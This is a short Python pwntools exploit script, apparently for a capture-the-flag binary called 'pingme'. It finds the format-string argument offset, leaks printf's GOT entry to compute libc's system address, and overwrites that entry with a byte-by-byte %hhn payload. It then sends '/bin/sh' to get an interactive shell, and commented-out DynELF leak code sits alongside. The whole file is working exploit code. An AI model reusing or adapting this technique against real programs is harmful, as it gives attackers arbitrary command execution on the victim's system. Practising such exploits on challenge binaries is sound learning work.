from pwn import *


def fmt_index(p):
    expect = b'ABCD44434241\n'
    for i in range (1,32):
        payload = "ABCD%{}$x".format(i)
        p.sendline(payload)
        data = p.recvline()
        if data == expect:
            return i
    return 0

tar = './pingme'
p = process(tar)
p.recvline()
index = fmt_index(p)

if index == 0:
    log.error("fmt_str arg index out of index:%d",3)
log.info("get fmt_str arg index %d\n",index)

printf_got = 0x08049974

# def get_printf_addr():
#     payload = b"%9$s.AAA" + p32(printf_got)
#     p.sendline(payload)
#     data = u32(p.recvuntil(".AAA")[:4])
#     log.info("printf address: %s" % data)
#     return data
# printf_addr = get_printf_addr()


# def leak(addr):
#     payload = b"%9$s.AAA" + p32(addr)
#     p.sendline(payload)
#     data = p.recvuntil(".AAA")[:-4] + b"\x00"
#     log.info("leaking: 0x%x --> %s" % (addr, data))
#     return data
# data = DynELF(leak, 0x08048490)     # 0x08048490 Entry point address
# system_addr = data.lookup('system', 'libc')
# printf_addr = data.lookup('printf', 'libc')
# log.info("system address: 0x%x" % system_addr)
# log.info("printf address: 0x%x" % printf_addr)



libc = ELF('/lib/i386-linux-gnu/libc.so.6')

payload = p32(printf_got)+b'%7$s'
p.sendline(payload)
printf_addr = u32(p.recvline()[4:8])
system_addr = printf_addr-(libc.symbols['printf']-libc.symbols['system'])

log.info("system address: 0x%x" % system_addr)

payload = b'\x74\x99\x04\x08\x75\x99\x04\x08\x76\x99\x04\x08\x77\x99\x04\x08%80c%7$hhn%48c%8$hhn%80c%9$hhn%23c%10$hhn'
#payload = fmtstr_payload(7, {printf_got: system_addr})
p.sendline(payload)
p.recv()
p.sendline('/bin/sh')
p.interactive()